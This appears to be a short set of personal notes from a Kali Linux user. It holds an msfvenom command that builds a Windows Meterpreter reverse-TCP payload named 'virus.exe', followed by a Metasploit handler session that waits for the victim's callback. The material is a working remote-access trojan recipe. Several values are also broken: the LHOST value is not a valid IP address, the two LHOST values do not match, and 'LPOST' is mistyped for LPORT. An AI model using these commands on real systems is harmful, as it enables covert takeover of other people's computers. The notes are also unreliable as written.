
#SOCIAL ENGINEERING TOOLS > msf payload creator
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2070 LPORT=9999 > /home/kali/Documentos/virus.exe


#METAPLOIT 
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.1.1
LHOST => 192.168.1.1
msf6 exploit(multi/handler) > set LPOST 9999
LPOST => 9999
msf6 exploit(multi/handler) > exploit -j 